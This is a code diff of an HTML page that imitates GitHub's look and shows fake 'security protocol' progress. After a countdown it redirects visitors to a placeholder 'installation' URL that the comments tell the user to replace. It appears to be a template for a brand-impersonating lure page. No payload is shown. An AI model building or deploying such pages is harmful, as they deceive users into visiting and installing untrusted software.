@@ -1,33 +1,240 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub - External Application Redirect</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: #161b22;
+            border-radius: 12px;
+            border: 1px solid #30363d;
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+        
+        .github-logo {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(90deg, #f0f6fc, #8b949e);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #f0f6fc;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #8b949e;
+            font-size: 16px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #30363d;
+        }
+        
+        .progress-container {
+            margin: 30px 0;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #8b949e;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background-color: #21262d;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            width: 10%;
+            background: linear-gradient(90deg, #1f6feb, #2ea043);
+            border-radius: 4px;
+            animation: progressAnimation 2s ease-in-out forwards;
+        }
+        
+        @keyframes progressAnimation {
+            0% { width: 10%; }
+            100% { width: 100%; }
+        }
+        
+        .status-list {
+            list-style: none;
+            margin: 25px 0 35px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #21262d;
+            font-size: 15px;
+        }
+        
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        
+        .status-icon {
+            margin-right: 12px;
+            color: #2ea043;
+        }
+        
+        .status-details {
+            flex-grow: 1;
+        }
+        
+        .status-text {
+            color: #c9d1d9;
+        }
+        
+        .status-arrow {
+            color: #484f58;
+        }
+        
+        .redirect-message {
+            background-color: #0d1117;
+            border-radius: 6px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid #30363d;
+            margin-top: 25px;
+            font-size: 14px;
+            color: #8b949e;
+        }
+        
+        .redirect-message strong {
+            color: #f0f6fc;
+        }
+        
+        .countdown {
+            color: #2ea043;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 640px) {
+            .container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-
-<div class="wrapper">
-  <img src="logo.png" class="logo" alt="Logo">
-
-  <h1>GitHub</h1>
-  <p class="subtitle">Preparing to redirect to external application</p>
-
-  <div class="card">
-    <div class="status">
-      <span class="dot"></span>
-      Initializing security protocols
+    <div class="container">
+        <div class="header">
+            <div class="github-logo">GitHub</div>
+        </div>
+        
+        <h1>Preparing to redirect to external application</h1>
+        
+        <div class="subtitle">
+            You will be redirected to the installation page shortly
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-label">
+                <span>Processing request</span>
+                <span id="progress-percent">10%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+        
+        <ul class="status-list">
+            <li class="status-item">
+                <div class="status-icon">✓</div>
+                <div class="status-details">
+                    <div class="status-text">Initializing security protocols</div>
+                </div>
+                <div class="status-arrow">main → external-app</div>
+            </li>
+        </ul>
+        
+        <div class="redirect-message">
+            Redirecting to external application in <span id="countdown" class="countdown">5</span> seconds...
+        </div>
     </div>
 
-    <button class="branch">main → external-app</button>
-
-    <div class="grid" id="grid"></div>
-  </div>
-
-  <p class="footer">You will be redirected shortly</p>
-</div>
-
-<script src="script.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const progressPercent = document.getElementById('progress-percent');
+            const countdownElement = document.getElementById('countdown');
+            let countdown = 5;
+            let progress = 10;
+            
+            // Обновляем прогресс-бар
+            const progressInterval = setInterval(() => {
+                if (progress < 100) {
+                    progress += 5;
+                    progressPercent.textContent = progress + '%';
+                }
+            }, 200);
+            
+            // Обратный отсчет
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    clearInterval(progressInterval);
+                    redirectToExternalApp();
+                }
+            }, 1000);
+            
+            function redirectToExternalApp() {
+                // Замените этот URL на ваш целевой URL
+                const externalAppUrl = 'https://example.com/installation';
+                
+                // Перенаправление на внешнее приложение
+                window.location.href = externalAppUrl;
+            }
+            
+            // Также позволяем пользователю нажать на сообщение для немедленного перехода
+            document.querySelector('.redirect-message').addEventListener('click', redirectToExternalApp);
+        });
+    </script>
 </body>
 </html>
